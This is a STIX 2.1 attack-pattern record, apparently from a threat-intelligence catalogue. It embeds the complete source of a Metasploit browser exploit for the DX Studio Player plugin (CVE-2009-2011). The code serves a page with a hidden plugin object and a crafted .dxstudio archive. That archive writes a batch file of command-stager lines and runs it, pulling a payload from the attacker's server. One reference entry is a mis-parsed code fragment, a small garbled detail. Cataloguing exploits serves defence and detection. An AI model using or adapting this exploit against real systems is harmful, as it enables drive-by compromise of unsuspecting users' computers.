{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b04af3bb-8861-4b6c-a41a-571456e5906b",
    "created": "2024-08-14T16:41:38.958231Z",
    "modified": "2024-08-14T16:41:38.958235Z",
    "name": "Worldweaver DX Studio Player shell.execute() Command Execution",
    "description": " This module exploits a command execution vulnerability within the DX Studio Player from Worldweaver for versions 3.0.29 and earlier. The player is a browser plugin for IE (ActiveX) and Firefox (dll). When an unsuspecting user visits a web page referring to a specially crafted .dxstudio document, an attacker can execute arbitrary commands.  Testing was conducted using plugin version 3.0.29.0 for Firefox 2.0.0.20 and IE 6 on Windows XP SP3. In IE, the user will be prompted if they wish to allow the plug-in to access local files. This prompt appears to occur only once per server host.  NOTE: This exploit uses additionally dangerous script features to write to local files!  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/dxstudio_player_exec.rb",
            "external_id": "dxstudio_player_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2011"
        },
        {
            "source_name": "reference",
            "url": "http://dxstudio.com/guide.aspx"
        },
        {
            "source_name": "html.gsub!(/DXURL/",
            "external_id": "payload_url)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/zip'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Worldweaver DX Studio Player shell.execute() Command Execution',\n      'Description'    => %q{\n        This module exploits a command execution vulnerability within the DX\n        Studio Player from Worldweaver for versions 3.0.29 and earlier. The\n        player is a browser plugin for IE (ActiveX) and Firefox (dll). When an\n        unsuspecting user visits a web page referring to a specially crafted\n        .dxstudio document, an attacker can execute arbitrary commands.\n\n        Testing was conducted using plugin version 3.0.29.0 for Firefox 2.0.0.20\n        and IE 6 on Windows XP SP3. In IE, the user will be prompted if they\n        wish to allow the plug-in to access local files. This prompt appears to\n        occur only once per server host.\n\n        NOTE: This exploit uses additionally dangerous script features to write\n        to local files!\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-2011' ],\n          [ 'BID', '35273' ],\n          [ 'OSVDB', '54969' ],\n          [ 'EDB', '8922' ],\n          [ 'URL', 'http://dxstudio.com/guide.aspx' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n        },\n      'Platform'       => 'win',\n      # 'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'CmdStagerFlavor' => 'vbs',\n      'DisclosureDate' => '2009-06-09',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n\n    url_base =  \"http://\"\n    url_base += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    url_base += \":\" + datastore['SRVPORT'].to_s + get_resource()\n\n    payload_url = url_base + \"/payload\"\n\n    # handle request for the payload\n    if (request.uri.match(/payload/))\n\n      # build the payload\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      cmds = generate_cmdstager({:linemax => 2047}, p)\n      scr = \"\"\n      cmds.each { |ln|\n        scr << \"f.writeString('\"\n        scr << ln\n        scr << \"\\\\n');\\n\"\n      }\n\n      # make header.xml\n      hdrxml = %Q|<?xml version=\"1.0\"?>\n<dxstudio>\n<script><![CDATA[function onInit()\n{\nvar f=system.file.openWrite(\"BATNAME\");\nf.writeString('@echo off\\\\n');\nCMDS\nf.close();\nshell.execute(\"BATNAME\");\n}]]>\n</script>\n</dxstudio>\n|\n      hdrxml.gsub!(/CMDS/, scr);\n      bat_name = rand_text_alphanumeric(rand(32)) + \".bat\"\n      hdrxml.gsub!(/BATNAME/, bat_name);\n\n      # craft the zip archive\n      zip = Rex::Zip::Archive.new\n      zip.add_file(\"header.xml\", hdrxml)\n      data = zip.pack\n\n      print_status(\"Sending file.dxstudio payload\")\n      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })\n\n      # Handle the payload\n      # handler(cli)\n      return\n    end\n\n    # otherwise, send the html..\n    html = %Q|<html>\n<body>\n<div height=100%>\nPlease wait...\n</div>\n<object width=1 height=1 classid='clsid:0AC2706C-8623-46F8-9EDD-8F71A897FDAE'>\n<param name=\"src\" value=\"DXURL\" />\n<embed width=1 height=1 src=DXURL type=\"application/x-dxstudio\">\n</embed>\n</object>\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name} HTML\")\n    # Transmit the compressed response to the client\n    html.gsub!(/DXURL/, payload_url)\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n  end\nend\n\n=begin\nTODO:\n- make it more quiet\n- auto-migrate?\n=end\n",
    "x_mitre_disclosure_date": "2009-06-09",
    "x_mitre_platforms": [
        "win'"
    ]
}